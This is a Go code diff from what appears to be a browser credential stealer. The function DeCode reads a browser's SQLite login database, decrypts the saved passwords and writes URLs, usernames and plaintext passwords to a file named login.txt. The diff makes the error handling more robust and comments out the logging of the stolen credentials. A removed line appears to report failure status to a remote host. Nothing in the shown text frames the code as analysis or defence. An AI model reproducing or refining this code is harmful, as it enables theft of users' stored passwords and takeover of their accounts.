@@ -31,31 +31,32 @@ type Login struct {
 	Pwd    string `json:"password"`
 }
 
-func DeCode(path string, addr string) {
+func DeCode(path string, addr string) error {
 	err := FileExits(path)
 	if err != nil {
-		ErrorStatusCode(200, HOSTID, addr+"browser_fail")
-		return
+		log.Println(err)
+		return err
 	}
 	log.Printf("Is Windows 64: %v\n", sqlite3.SQLiteWin64)
 	db, err := sql.Open("sqlite3", path)
 	if err != nil {
-		log.Fatal(err)
-
+		log.Println(err, VERSION)
+		return err
 	}
 	defer db.Close()
 
 	rows, err := db.Query("select origin_url,action_url,username_value,password_value from logins")
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
+		return err
 	}
 	defer rows.Close()
-	arr := make([]string, 1)
+	arr := make([]string, 0)
 	for rows.Next() {
 		var origin_url, action_url, username, passwdEncrypt string
 		err = rows.Scan(&origin_url, &action_url, &username, &passwdEncrypt)
 		if err != nil {
-			log.Fatal(err)
+			log.Println(err)
 		}
 		passwdByte := []byte(passwdEncrypt)
 		dataout, _ := Decrypt(passwdByte)
@@ -73,7 +74,8 @@ func DeCode(path string, addr string) {
 	}
 	f, ferr := os.Create(BrowserSafepath + "login.txt")
 	if ferr != nil {
-		log.Println(ferr)
+		//log.Println(ferr)
+		return ferr
 	}
 	defer f.Close()
 	w := bufio.NewWriter(f)
@@ -81,11 +83,13 @@ func DeCode(path string, addr string) {
 		fmt.Fprintln(w, line)
 	}
 	w.Flush()
-	log.Println(arr)
+	//log.Println(arr)
 	err = rows.Err()
 	if err != nil {
-		log.Fatal(err)
+		//log.Fatal(err)
+		return err
 	}
+	return nil
 }
 
 type DATA_BLOB struct {
